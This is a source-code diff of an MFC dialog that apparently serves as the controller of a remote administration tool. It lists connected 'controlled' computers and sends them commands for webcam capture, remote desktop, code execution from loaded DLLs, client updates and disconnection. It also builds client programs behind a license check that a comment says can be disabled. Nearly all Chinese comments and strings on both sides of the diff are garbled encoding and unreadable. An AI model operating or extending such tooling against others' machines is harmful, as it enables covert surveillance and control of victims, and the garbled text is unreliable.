-	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "ÉãÏñÍ·"}, {SOFTWARE_TELEGRAM, "µç±¨" }};
+	std::map<int, std::string> myMap = {{SOFTWARE_CAMERA, "æ‘„åƒå¤´"}, {SOFTWARE_TELEGRAM, "ç”µæŠ¥" }};
 	std::string str = myMap[n];
 	LVCOLUMN lvColumn;
 	memset(&lvColumn, 0, sizeof(LVCOLUMN));
@@ -744,7 +753,7 @@ BOOL CMy2015RemoteDlg::OnInitDialog()
 	SetTimer(TIMER_CHECK, 600 * 1000, NULL);
 #endif
 
-	return TRUE;  // ³ı·Ç½«½¹µãÉèÖÃµ½¿Ø¼ş£¬·ñÔò·µ»Ø TRUE
+	return TRUE;  // é™¤éå°†ç„¦ç‚¹è®¾ç½®åˆ°æ§ä»¶ï¼Œå¦åˆ™è¿”å› TRUE
 }
 
 void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
@@ -760,19 +769,19 @@ void CMy2015RemoteDlg::OnSysCommand(UINT nID, LPARAM lParam)
 	}
 }
 
-// Èç¹ûÏò¶Ô»°¿òÌí¼Ó×îĞ¡»¯°´Å¥£¬ÔòĞèÒªÏÂÃæµÄ´úÂë
-//  À´»æÖÆ¸ÃÍ¼±ê¡£¶ÔÓÚÊ¹ÓÃÎÄµµ/ÊÓÍ¼Ä£ĞÍµÄ MFC Ó¦ÓÃ³ÌĞò£¬
-//  Õâ½«ÓÉ¿ò¼Ü×Ô¶¯Íê³É¡£
+// å¦‚æœå‘å¯¹è¯æ¡†æ·»åŠ æœ€å°åŒ–æŒ‰é’®ï¼Œåˆ™éœ€è¦ä¸‹é¢çš„ä»£ç 
+//  æ¥ç»˜åˆ¶è¯¥å›¾æ ‡ã€‚å¯¹äºä½¿ç”¨æ–‡æ¡£/è§†å›¾æ¨¡å‹çš„ MFC åº”ç”¨ç¨‹åºï¼Œ
+//  è¿™å°†ç”±æ¡†æ¶è‡ªåŠ¨å®Œæˆã€‚
 
 void CMy2015RemoteDlg::OnPaint()
 {
 	if (IsIconic())
 	{
-		CPaintDC dc(this); // ÓÃÓÚ»æÖÆµÄÉè±¸ÉÏÏÂÎÄ
+		CPaintDC dc(this); // ç”¨äºç»˜åˆ¶çš„è®¾å¤‡ä¸Šä¸‹æ–‡
 
 		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);
 
-		// Ê¹Í¼±êÔÚ¹¤×÷Çø¾ØĞÎÖĞ¾ÓÖĞ
+		// ä½¿å›¾æ ‡åœ¨å·¥ä½œåŒºçŸ©å½¢ä¸­å±…ä¸­
 		int cxIcon = GetSystemMetrics(SM_CXICON);
 		int cyIcon = GetSystemMetrics(SM_CYICON);
 		CRect rect;
@@ -780,7 +789,7 @@ void CMy2015RemoteDlg::OnPaint()
 		int x = (rect.Width() - cxIcon + 1) / 2;
 		int y = (rect.Height() - cyIcon + 1) / 2;
 
-		// »æÖÆÍ¼±ê
+		// ç»˜åˆ¶å›¾æ ‡
 		dc.DrawIcon(x, y, m_hIcon);
 	}
 	else
@@ -789,8 +798,8 @@ void CMy2015RemoteDlg::OnPaint()
 	}
 }
 
-//µ±ÓÃ»§ÍÏ¶¯×îĞ¡»¯´°¿ÚÊ±ÏµÍ³µ÷ÓÃ´Ëº¯ÊıÈ¡µÃ¹â±ê
-//ÏÔÊ¾¡£
+//å½“ç”¨æˆ·æ‹–åŠ¨æœ€å°åŒ–çª—å£æ—¶ç³»ç»Ÿè°ƒç”¨æ­¤å‡½æ•°å–å¾—å…‰æ ‡
+//æ˜¾ç¤ºã€‚
 HCURSOR CMy2015RemoteDlg::OnQueryDragIcon()
 {
 	return static_cast<HCURSOR>(m_hIcon);
@@ -800,27 +809,27 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
 {
 	CDialogEx::OnSize(nType, cx, cy);
 
-	// TODO: ÔÚ´Ë´¦Ìí¼ÓÏûÏ¢´¦Àí³ÌĞò´úÂë
+	// TODO: åœ¨æ­¤å¤„æ·»åŠ æ¶ˆæ¯å¤„ç†ç¨‹åºä»£ç 
 	if (SIZE_MINIMIZED==nType)
 	{
 		return;
 	} 
 	EnterCriticalSection(&m_cs);
-	if (m_CList_Online.m_hWnd!=NULL)   //£¨¿Ø¼şÒ²ÊÇ´°¿ÚÒò´ËÒ²ÓĞ¾ä±ú£©
+	if (m_CList_Online.m_hWnd!=NULL)   //ï¼ˆæ§ä»¶ä¹Ÿæ˜¯çª—å£å› æ­¤ä¹Ÿæœ‰å¥æŸ„ï¼‰
 	{
 		CRect rc;
-		rc.left = 1;          //ÁĞ±íµÄ×ó×ø±ê     
-		rc.top  = 80;         //ÁĞ±íµÄÉÏ×ø±ê
-		rc.right  =  cx-1;    //ÁĞ±íµÄÓÒ×ø±ê
-		rc.bottom = cy-160;   //ÁĞ±íµÄÏÂ×ø±ê
+		rc.left = 1;          //åˆ—è¡¨çš„å·¦åæ ‡     
+		rc.top  = 80;         //åˆ—è¡¨çš„ä¸Šåæ ‡
+		rc.right  =  cx-1;    //åˆ—è¡¨çš„å³åæ ‡
+		rc.bottom = cy-160;   //åˆ—è¡¨çš„ä¸‹åæ ‡
 		m_CList_Online.MoveWindow(rc);
 
-		for(int i=0;i<g_Column_Count_Online;++i){           //±éÀúÃ¿Ò»¸öÁĞ
-			double Temp=g_Column_Data_Online[i].nWidth;     //µÃµ½µ±Ç°ÁĞµÄ¿í¶È   138
-			Temp/=g_Column_Online_Width;                    //¿´Ò»¿´µ±Ç°¿í¶ÈÕ¼×Ü³¤¶ÈµÄ¼¸·ÖÖ®¼¸
-			Temp*=cx;                                       //ÓÃÔ­À´µÄ³¤¶È³ËÒÔËùÕ¼µÄ¼¸·ÖÖ®¼¸µÃµ½µ±Ç°µÄ¿í¶È
-			int lenth = Temp;                               //×ª»»Îªint ÀàĞÍ
-			m_CList_Online.SetColumnWidth(i,(lenth));       //ÉèÖÃµ±Ç°µÄ¿í¶È
+		for(int i=0;i<g_Column_Count_Online;++i){           //éå†æ¯ä¸€ä¸ªåˆ—
+			double Temp=g_Column_Data_Online[i].nWidth;     //å¾—åˆ°å½“å‰åˆ—çš„å®½åº¦   138
+			Temp/=g_Column_Online_Width;                    //çœ‹ä¸€çœ‹å½“å‰å®½åº¦å æ€»é•¿åº¦çš„å‡ åˆ†ä¹‹å‡ 
+			Temp*=cx;                                       //ç”¨åŸæ¥çš„é•¿åº¦ä¹˜ä»¥æ‰€å çš„å‡ åˆ†ä¹‹å‡ å¾—åˆ°å½“å‰çš„å®½åº¦
+			int lenth = Temp;                               //è½¬æ¢ä¸ºint ç±»å‹
+			m_CList_Online.SetColumnWidth(i,(lenth));       //è®¾ç½®å½“å‰çš„å®½åº¦
 		}
 	}
 	LeaveCriticalSection(&m_cs);
@@ -828,21 +837,21 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
 	if (m_CList_Message.m_hWnd!=NULL)
 	{
 		CRect rc;
-		rc.left = 1;         //ÁĞ±íµÄ×ó×ø±ê
-		rc.top = cy-156;     //ÁĞ±íµÄÉÏ×ø±ê
-		rc.right  = cx-1;    //ÁĞ±íµÄÓÒ×ø±ê
-		rc.bottom = cy-20;   //ÁĞ±íµÄÏÂ×ø±ê
+		rc.left = 1;         //åˆ—è¡¨çš„å·¦åæ ‡
+		rc.top = cy-156;     //åˆ—è¡¨çš„ä¸Šåæ ‡
+		rc.right  = cx-1;    //åˆ—è¡¨çš„å³åæ ‡
+		rc.bottom = cy-20;   //åˆ—è¡¨çš„ä¸‹åæ ‡
 		m_CList_Message.MoveWindow(rc);
-		for(int i=0;i<g_Column_Count_Message;++i){           //±éÀúÃ¿Ò»¸öÁĞ
-			double Temp=g_Column_Data_Message[i].nWidth;     //µÃµ½µ±Ç°ÁĞµÄ¿í¶È
-			Temp/=g_Column_Message_Width;                    //¿´Ò»¿´µ±Ç°¿í¶ÈÕ¼×Ü³¤¶ÈµÄ¼¸·ÖÖ®¼¸
-			Temp*=cx;                                        //ÓÃÔ­À´µÄ³¤¶È³ËÒÔËùÕ¼µÄ¼¸·ÖÖ®¼¸µÃµ½µ±Ç°µÄ¿í¶È
-			int lenth=Temp;                                  //×ª»»Îªint ÀàĞÍ
-			m_CList_Message.SetColumnWidth(i,(lenth));        //ÉèÖÃµ±Ç°µÄ¿í¶È
+		for(int i=0;i<g_Column_Count_Message;++i){           //éå†æ¯ä¸€ä¸ªåˆ—
+			double Temp=g_Column_Data_Message[i].nWidth;     //å¾—åˆ°å½“å‰åˆ—çš„å®½åº¦
+			Temp/=g_Column_Message_Width;                    //çœ‹ä¸€çœ‹å½“å‰å®½åº¦å æ€»é•¿åº¦çš„å‡ åˆ†ä¹‹å‡ 
+			Temp*=cx;                                        //ç”¨åŸæ¥çš„é•¿åº¦ä¹˜ä»¥æ‰€å çš„å‡ åˆ†ä¹‹å‡ å¾—åˆ°å½“å‰çš„å®½åº¦
+			int lenth=Temp;                                  //è½¬æ¢ä¸ºint ç±»å‹
+			m_CList_Message.SetColumnWidth(i,(lenth));        //è®¾ç½®å½“å‰çš„å®½åº¦
 		}
 	}
 
-	if(m_StatusBar.m_hWnd!=NULL){    //µ±¶Ô»°¿ò´óĞ¡¸Ä±äÊ± ×´Ì¬Ìõ´óĞ¡Ò²ËæÖ®¸Ä±ä
+	if(m_StatusBar.m_hWnd!=NULL){    //å½“å¯¹è¯æ¡†å¤§å°æ”¹å˜æ—¶ çŠ¶æ€æ¡å¤§å°ä¹Ÿéšä¹‹æ”¹å˜
 		CRect Rect;
 		Rect.top=cy-20;
 		Rect.left=0;
@@ -852,13 +861,13 @@ void CMy2015RemoteDlg::OnSize(UINT nType, int cx, int cy)
 		m_StatusBar.SetPaneInfo(0, m_StatusBar.GetItemID(0),SBPS_POPOUT, cx-10);
 	}
 
-	if(m_ToolBar.m_hWnd!=NULL)                  //¹¤¾ßÌõ
+	if(m_ToolBar.m_hWnd!=NULL)                  //å·¥å…·æ¡
 	{
 		CRect rc;
 		rc.top=rc.left=0;
 		rc.right=cx;
 		rc.bottom=80;
-		m_ToolBar.MoveWindow(rc);             //ÉèÖÃ¹¤¾ßÌõ´óĞ¡Î»ÖÃ
+		m_ToolBar.MoveWindow(rc);             //è®¾ç½®å·¥å…·æ¡å¤§å°ä½ç½®
 	}
 }
 
@@ -871,11 +880,11 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
 		{
 			KillTimer(nIDEvent);
 			CInputDialog dlg(this);
-			dlg.Init("ÊäÈëÃÜÂë", "ÊäÈëÖ÷¿Ø³ÌĞòµÄÃÜÂë:");
+			dlg.Init("è¾“å…¥å¯†ç ", "è¾“å…¥ä¸»æ§ç¨‹åºçš„å¯†ç :");
 			dlg.DoModal();
 			if (hashSHA256(dlg.m_str.GetString()) != std::string(skCrypt(MASTER_HASH)))
 				return OnMainExit();
-			MessageBox("Çë¼°Ê±¶Ôµ±Ç°Ö÷¿Ø³ÌĞòÊÚÈ¨: ÔÚ¹¤¾ß²Ëµ¥ÖĞÉú³É¿ÚÁî!", "ÌáÊ¾", MB_ICONWARNING);
+			MessageBox("è¯·åŠæ—¶å¯¹å½“å‰ä¸»æ§ç¨‹åºæˆæƒ: åœ¨å·¥å…·èœå•ä¸­ç”Ÿæˆå£ä»¤!", "æç¤º", MB_ICONWARNING);
 		}
 	}
 }
@@ -883,7 +892,7 @@ void CMy2015RemoteDlg::OnTimer(UINT_PTR nIDEvent)
 
 void CMy2015RemoteDlg::OnClose()
 {
-	// Òş²Ø´°¿Ú¶ø²»ÊÇ¹Ø±Õ
+	// éšè—çª—å£è€Œä¸æ˜¯å…³é—­
 	ShowWindow(SW_HIDE);
 	Mprintf("======> Hide\n");
 }
@@ -925,7 +934,7 @@ int CALLBACK CMy2015RemoteDlg::CompareFunction(LPARAM lParam1, LPARAM lParam2, L
 	int nColumn = pSortInfo->first;
 	bool bAscending = pSortInfo->second;
 
-	// »ñÈ¡ÁĞÖµ
+	// è·å–åˆ—å€¼
 	CONTEXT_OBJECT* context1 = (CONTEXT_OBJECT*)lParam1;
 	CONTEXT_OBJECT* context2 = (CONTEXT_OBJECT*)lParam2;
 	CString s1 = context1->GetClientData(nColumn);
@@ -939,16 +948,16 @@ void CMy2015RemoteDlg::SortByColumn(int nColumn) {
 	static int m_nSortColumn = 0;
 	static bool m_bSortAscending = false;
 	if (nColumn == m_nSortColumn) {
-		// Èç¹ûµã»÷µÄÊÇÍ¬Ò»ÁĞ£¬ÇĞ»»ÅÅĞòË³Ğò
+		// å¦‚æœç‚¹å‡»çš„æ˜¯åŒä¸€åˆ—ï¼Œåˆ‡æ¢æ’åºé¡ºåº
 		m_bSortAscending = !m_bSortAscending;
 	}
 	else {
-		// ·ñÔò£¬ÇĞ»»µ½ĞÂÁĞ²¢ÉèÖÃÎªÉıĞò
+		// å¦åˆ™ï¼Œåˆ‡æ¢åˆ°æ–°åˆ—å¹¶è®¾ç½®ä¸ºå‡åº
 		m_nSortColumn = nColumn;
 		m_bSortAscending = true;
 	}
 
-	// ´´½¨ÅÅĞòĞÅÏ¢
+	// åˆ›å»ºæ’åºä¿¡æ¯
 	std::pair<int, bool> sortInfo(m_nSortColumn, m_bSortAscending);
 	EnterCriticalSection(&m_cs);
 	m_CList_Online.SortItems(CompareFunction, reinterpret_cast<LPARAM>(&sortInfo));
@@ -957,8 +966,8 @@ void CMy2015RemoteDlg::SortByColumn(int nColumn) {
 
 void CMy2015RemoteDlg::OnHdnItemclickList(NMHDR* pNMHDR, LRESULT* pResult) {
 	LPNMHEADER pNMHeader = reinterpret_cast<LPNMHEADER>(pNMHDR);
-	int nColumn = pNMHeader->iItem; // »ñÈ¡µã»÷µÄÁĞË÷Òı
-	SortByColumn(nColumn);          // µ÷ÓÃÅÅĞòº¯Êı
+	int nColumn = pNMHeader->iItem; // è·å–ç‚¹å‡»çš„åˆ—ç´¢å¼•
+	SortByColumn(nColumn);          // è°ƒç”¨æ’åºå‡½æ•°
 	*pResult = 0;
 }
 
@@ -967,10 +976,10 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 {
 	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
 
-	//µ¯³ö²Ëµ¥
+	//å¼¹å‡ºèœå•
 
 	CMenu	Menu;
-	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //¼ÓÔØ²Ëµ¥×ÊÔ´   ×ÊÔ´ºÍÀà¶ÔÏó¹ØÁª
+	Menu.LoadMenu(IDR_MENU_LIST_ONLINE);               //åŠ è½½èœå•èµ„æº   èµ„æºå’Œç±»å¯¹è±¡å…³è”
 
 	CMenu* SubMenu = Menu.GetSubMenu(0);
 
@@ -988,37 +997,37 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 	Menu.SetMenuItemBitmaps(ID_ONLINE_REMOTE_DESKTOP, MF_BYCOMMAND, &m_bmOnline[8], &m_bmOnline[8]);
 	Menu.SetMenuItemBitmaps(ID_ONLINE_H264_DESKTOP, MF_BYCOMMAND, &m_bmOnline[9], &m_bmOnline[9]);
 
-	// ´´½¨Ò»¸öĞÂµÄ×Ó²Ëµ¥
+	// åˆ›å»ºä¸€ä¸ªæ–°çš„å­èœå•
 	CMenu newMenu;
 	if (!newMenu.CreatePopupMenu()) {
-		AfxMessageBox(_T("´´½¨·ÖÅäÖ÷¿ØµÄ×Ó²Ëµ¥Ê§°Ü!"));
+		AfxMessageBox(_T("åˆ›å»ºåˆ†é…ä¸»æ§çš„å­èœå•å¤±è´¥!"));
 		return;
 	}
 
 	int i = 0;
 	for (const auto& s : m_DllList) {
-		// Ïò×Ó²Ëµ¥ÖĞÌí¼Ó²Ëµ¥Ïî
+		// å‘å­èœå•ä¸­æ·»åŠ èœå•é¡¹
 		newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE + i++, s->Name.c_str());
 	}
 	if (i == 0){
-		newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE, "²Ù×÷Ö¸µ¼");
+		newMenu.AppendMenuA(MF_STRING, ID_DYNAMIC_MENU_BASE, "æ“ä½œæŒ‡å¯¼");
 	}
-	// ½«×Ó²Ëµ¥Ìí¼Óµ½Ö÷²Ëµ¥ÖĞ
-	SubMenu->AppendMenuA(MF_STRING | MF_POPUP, (UINT_PTR)newMenu.Detach(), _T("Ö´ĞĞ´úÂë"));
+	// å°†å­èœå•æ·»åŠ åˆ°ä¸»èœå•ä¸­
+	SubMenu->AppendMenuA(MF_STRING | MF_POPUP, (UINT_PTR)newMenu.Detach(), _T("æ‰§è¡Œä»£ç "));
 
 	int	iCount = SubMenu->GetMenuItemCount();
 	EnterCriticalSection(&m_cs);
 	int n = m_CList_Online.GetSelectedCount();
 	LeaveCriticalSection(&m_cs);
-	if (n == 0)         //Èç¹ûÃ»ÓĞÑ¡ÖĞ
+	if (n == 0)         //å¦‚æœæ²¡æœ‰é€‰ä¸­
 	{
 		for (int i = 0; i < iCount; ++i)
 		{
-			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //²Ëµ¥È«²¿±ä»Ò
+			SubMenu->EnableMenuItem(i, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);          //èœå•å…¨éƒ¨å˜ç°
 		}
 	}
 
-	// Ë¢ĞÂ²Ëµ¥ÏÔÊ¾
+	// åˆ·æ–°èœå•æ˜¾ç¤º
 	DrawMenuBar();
 	SubMenu->TrackPopupMenu(TPM_LEFTALIGN, Point.x, Point.y, this);
 
@@ -1028,34 +1037,34 @@ void CMy2015RemoteDlg::OnNMRClickOnline(NMHDR *pNMHDR, LRESULT *pResult)
 
 void CMy2015RemoteDlg::OnOnlineMessage()
 {
-	BYTE bToken = COMMAND_TALK;   //Ïò±»¿Ø¶Ë·¢ËÍÒ»¸öCOMMAND_SYSTEM
+	BYTE bToken = COMMAND_TALK;   //å‘è¢«æ§ç«¯å‘é€ä¸€ä¸ªCOMMAND_SYSTEM
 	SendSelectedCommand(&bToken, sizeof(BYTE));
 }
 
 char* ReadFileToMemory(const CString& filePath, ULONGLONG &fileSize) {
 	fileSize = 0;
 	try {
-		// ´ò¿ªÎÄ¼ş£¨Ö»¶ÁÄ£Ê½£©
+		// æ‰“å¼€æ–‡ä»¶ï¼ˆåªè¯»æ¨¡å¼ï¼‰
 		CFile file(filePath, CFile::modeRead | CFile::typeBinary);
 
-		// »ñÈ¡ÎÄ¼ş´óĞ¡
+		// è·å–æ–‡ä»¶å¤§å°
 		fileSize = file.GetLength();
 
-		// ·ÖÅäÄÚ´æ»º³åÇø: Í·+ÎÄ¼ş´óĞ¡+ÎÄ¼şÄÚÈİ
+		// åˆ†é…å†…å­˜ç¼“å†²åŒº: å¤´+æ–‡ä»¶å¤§å°+æ–‡ä»¶å†…å®¹
 		char* buffer = new char[1 + sizeof(ULONGLONG) + static_cast<size_t>(fileSize) + 1];
 		if (!buffer) {
 			return NULL;
 		}
 		memcpy(buffer+1, &fileSize, sizeof(ULONGLONG));
-		// ¶ÁÈ¡ÎÄ¼şÄÚÈİµ½»º³åÇø
+		// è¯»å–æ–‡ä»¶å†…å®¹åˆ°ç¼“å†²åŒº
 		file.Read(buffer + 1 + sizeof(ULONGLONG), static_cast<UINT>(fileSize));
-		buffer[1 + sizeof(ULONGLONG) + fileSize] = '\0'; // Ìí¼Ó×Ö·û´®½áÊø·û
+		buffer[1 + sizeof(ULONGLONG) + fileSize] = '\0'; // æ·»åŠ å­—ç¬¦ä¸²ç»“æŸç¬¦
 
-		// ÊÍ·ÅÄÚ´æ
+		// é‡Šæ”¾å†…å­˜
 		return buffer;
 	}
 	catch (CFileException* e) {
-		// ²¶»ñÎÄ¼şÒì³£
+		// æ•è·æ–‡ä»¶å¼‚å¸¸
 		TCHAR errorMessage[256];
 		e->GetErrorMessage(errorMessage, 256);
 		e->Delete();
@@ -1066,8 +1075,8 @@ char* ReadFileToMemory(const CString& filePath, ULONGLONG &fileSize) {
 
 void CMy2015RemoteDlg::OnOnlineUpdate()
 {
-	if (IDYES != MessageBox(_T("È·¶¨Éı¼¶Ñ¡¶¨µÄ±»¿Ø³ÌĞòÂğ?\nĞèÊÜ¿Ø³ÌĞòÖ§³Ö·½¿ÉÉúĞ§!"), 
-		_T("ÌáÊ¾"), MB_ICONQUESTION | MB_YESNO))
+	if (IDYES != MessageBox(_T("ç¡®å®šå‡çº§é€‰å®šçš„è¢«æ§ç¨‹åºå—?\néœ€å—æ§ç¨‹åºæ”¯æŒæ–¹å¯ç”Ÿæ•ˆ!"), 
+		_T("æç¤º"), MB_ICONQUESTION | MB_YESNO))
 		return;
 
 	char path[_MAX_PATH], * p = path;
@@ -1083,17 +1092,17 @@ void CMy2015RemoteDlg::OnOnlineUpdate()
 		delete[] buffer;
 	}
 	else {
-		AfxMessageBox("¶ÁÈ¡ÎÄ¼şÊ§°Ü: "+ CString(path));
+		AfxMessageBox("è¯»å–æ–‡ä»¶å¤±è´¥: "+ CString(path));
 	}
 }
 
 void CMy2015RemoteDlg::OnOnlineDelete()
 {
-	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
-	if (IDYES != MessageBox(_T("È·¶¨É¾³ıÑ¡¶¨µÄ±»¿Ø¼ÆËã»úÂğ?"), _T("ÌáÊ¾"), MB_ICONQUESTION | MB_YESNO))
+	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
+	if (IDYES != MessageBox(_T("ç¡®å®šåˆ é™¤é€‰å®šçš„è¢«æ§è®¡ç®—æœºå—?"), _T("æç¤º"), MB_ICONQUESTION | MB_YESNO))
 		return;
 
-	BYTE bToken = COMMAND_BYE;   //Ïò±»¿Ø¶Ë·¢ËÍÒ»¸öCOMMAND_SYSTEM
+	BYTE bToken = COMMAND_BYE;   //å‘è¢«æ§ç«¯å‘é€ä¸€ä¸ªCOMMAND_SYSTEM
 	SendSelectedCommand(&bToken, sizeof(BYTE));   //Context     PreSending   PostSending
 
 	EnterCriticalSection(&m_cs);
@@ -1104,7 +1113,7 @@ void CMy2015RemoteDlg::OnOnlineDelete()
 		int iItem = m_CList_Online.GetNextSelectedItem(Pos);
 		CString strIP = m_CList_Online.GetItemText(iItem,ONLINELIST_IP);  
 		m_CList_Online.DeleteItem(iItem);
-		strIP+="¶Ï¿ªÁ¬½Ó";
+		strIP+="æ–­å¼€è¿æ¥";
 		ShowMessage(true,strIP);
 	}
 	LeaveCriticalSection(&m_cs);
@@ -1190,7 +1199,7 @@ std::string joinString(const std::vector<std::string>& tokens, char delimiter) {
 
 	for (size_t i = 0; i < tokens.size(); ++i) {
 		oss << tokens[i];
-		if (i != tokens.size() - 1) {  // ÔÚ×îºóÒ»¸öÔªËØºó²»Ìí¼Ó·Ö¸ô·û
+		if (i != tokens.size() - 1) {  // åœ¨æœ€åä¸€ä¸ªå…ƒç´ åä¸æ·»åŠ åˆ†éš”ç¬¦
 			oss << delimiter;
 		}
 	}
@@ -1210,7 +1219,7 @@ bool CMy2015RemoteDlg::CheckValid() {
 	if (!isTrail) {
 		auto THIS_APP = (CMy2015RemoteApp*)AfxGetApp();
 		auto settings = "settings", pwdKey = "Password";
-		// ÑéÖ¤¿ÚÁî
+		// éªŒè¯å£ä»¤
 		CPasswordDlg dlg;
 		static std::string hardwareID = getHardwareID();
 		static std::string hashedID = hashSHA256(hardwareID);
@@ -1222,12 +1231,12 @@ bool CMy2015RemoteDlg::CheckValid() {
 		if (pwd.IsEmpty() && IDOK != dlg.DoModal() || dlg.m_sPassword.IsEmpty())
 			return false;
 
-		// ÃÜÂëĞÎÊ½£º20250209 - 20350209: SHA256
+		// å¯†ç å½¢å¼ï¼š20250209 - 20350209: SHA256
 		auto v = splitString(dlg.m_sPassword.GetBuffer(), '-');
 		if (v.size() != 6)
 		{
 			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
-			MessageBox("¸ñÊ½´íÎó£¬ÇëÖØĞÂÉêÇë¿ÚÁî!", "ÌáÊ¾", MB_ICONINFORMATION);
+			MessageBox("æ ¼å¼é”™è¯¯ï¼Œè¯·é‡æ–°ç”³è¯·å£ä»¤!", "æç¤º", MB_ICONINFORMATION);
 			return false;
 		}
 		std::vector<std::string> subvector(v.begin() + 2, v.end());
@@ -1239,17 +1248,17 @@ bool CMy2015RemoteDlg::CheckValid() {
 			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
 			if (pwd.IsEmpty() || (IDOK != dlg.DoModal() || hash256 != fixedKey)) {
 				if (!dlg.m_sPassword.IsEmpty())
-					MessageBox("¿ÚÁî´íÎó, ÎŞ·¨¼ÌĞø²Ù×÷!", "ÌáÊ¾", MB_ICONWARNING);
+					MessageBox("å£ä»¤é”™è¯¯, æ— æ³•ç»§ç»­æ“ä½œ!", "æç¤º", MB_ICONWARNING);
 				return false;
 			}
 		}
-		// ÅĞ¶ÏÊÇ·ñ¹ıÆÚ
+		// åˆ¤æ–­æ˜¯å¦è¿‡æœŸ
 		auto pekingTime = ToPekingTime(nullptr);
 		char curDate[9];
 		std::strftime(curDate, sizeof(curDate), "%Y%m%d", &pekingTime);
 		if (curDate < v[0] || curDate > v[1]) {
 			THIS_APP->m_iniFile.SetStr(settings, pwdKey, "");
-			MessageBox("¿ÚÁî¹ıÆÚ£¬ÇëÖØĞÂÉêÇë¿ÚÁî!", "ÌáÊ¾", MB_ICONINFORMATION);
+			MessageBox("å£ä»¤è¿‡æœŸï¼Œè¯·é‡æ–°ç”³è¯·å£ä»¤!", "æç¤º", MB_ICONINFORMATION);
 			return false;
 		}
 		if (dlg.m_sPassword != pwd)
@@ -1260,15 +1269,15 @@ bool CMy2015RemoteDlg::CheckValid() {
 
 void CMy2015RemoteDlg::OnOnlineBuildClient()
 {
-	// ¸øĞÂ±àÒëµÄ³ÌĞò14ÌìÊÔÓÃÆÚ£¬¹ıÆÚÖ®ºóÉú³É·şÎñ¶ËĞèÒªÉêÇë"¿ÚÁî"£»
-	// Èç¹ûÒª¶ÔÆäËû¹¦ÄÜÄËÖÁÕû¸ö³ÌĞòÆô¶¯ÊÚÈ¨Âß¼­£¬½«ÏÂÊöifÓï¾äÌí¼Óµ½ÏàÓ¦µØ·½¼´¿É¡£
-	// ¿ÚÁî°üº¬ÊÚÈ¨ÈÕÆÚ·¶Î§£¬È·±£Ò»»úÒ»Âë£»ÊÚÈ¨Âß¼­»á¼ì²â¼ÆËã»úÈÕÆÚÎ´±»´Û¸Ä!
-	// ×¢ÊÍÏÂÃæ if Óï¾ä¿ÉÒÔÆÁ±Î¸ÃÊÚÈ¨Âß¼­.
+	// ç»™æ–°ç¼–è¯‘çš„ç¨‹åº14å¤©è¯•ç”¨æœŸï¼Œè¿‡æœŸä¹‹åç”ŸæˆæœåŠ¡ç«¯éœ€è¦ç”³è¯·"å£ä»¤"ï¼›
+	// å¦‚æœè¦å¯¹å…¶ä»–åŠŸèƒ½ä¹ƒè‡³æ•´ä¸ªç¨‹åºå¯åŠ¨æˆæƒé€»è¾‘ï¼Œå°†ä¸‹è¿°ifè¯­å¥æ·»åŠ åˆ°ç›¸åº”åœ°æ–¹å³å¯ã€‚
+	// å£ä»¤åŒ…å«æˆæƒæ—¥æœŸèŒƒå›´ï¼Œç¡®ä¿ä¸€æœºä¸€ç ï¼›æˆæƒé€»è¾‘ä¼šæ£€æµ‹è®¡ç®—æœºæ—¥æœŸæœªè¢«ç¯¡æ”¹!
+	// æ³¨é‡Šä¸‹é¢ if è¯­å¥å¯ä»¥å±è”½è¯¥æˆæƒé€»è¾‘.
 	// 2025/04/20 
 	if (!CheckValid())
 		return;
 
-	// TODO: ÔÚ´ËÌí¼ÓÃüÁî´¦Àí³ÌĞò´úÂë
+	// TODO: åœ¨æ­¤æ·»åŠ å‘½ä»¤å¤„ç†ç¨‹åºä»£ç 
 	CBuildDlg Dlg;
 	Dlg.m_strIP = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetStr("settings", "localIp", "");
 	int Port = ((CMy2015RemoteApp*)AfxGetApp())->m_iniFile.GetInt("settings", "ghost");
@@ -1288,24 +1297,24 @@ VOID CMy2015RemoteDlg::SendSelectedCommand(PBYTE  szBuffer, ULONG ulLength)
 		CONTEXT_OBJECT* ContextObject = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(iItem);
 		if (!ContextObject->bLogin && szBuffer[0] != COMMAND_BYE)
 			continue;
-		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->sClientInfo[ONLINELIST_VIDEO] == CString("ÎŞ"))
+		if (szBuffer[0]== COMMAND_WEBCAM && ContextObject->sClientInfo[ONLINELIST_VIDEO] == CString("æ— "))
 		{
 			continue;
 		}
-		// ·¢ËÍ»ñµÃÇı¶¯Æ÷ÁĞ±íÊı¾İ°ü
+		// å‘é€è·å¾—é©±åŠ¨å™¨åˆ—è¡¨æ•°æ®åŒ…
 		m_iocpServer->OnClientPreSending(ContextObject,szBuffer, ulLength);
 	} 
 	LeaveCriticalSection(&m_cs);
 }
 
-//Õæ²ÊBar
+//çœŸå½©Bar
 VOID CMy2015RemoteDlg::OnAbout()
 {
-	MessageBox("Copyleft (c) FTU 2025" + CString("\n±àÒëÈÕÆÚ: ") + __DATE__ + 
-		CString(sizeof(void*)==8 ? " (x64)" : " (x86)"), "¹ØÓÚ");
+	MessageBox("Copyleft (c) FTU 2025" + CString("\nç¼–è¯‘æ—¥æœŸ: ") + __DATE__ + 
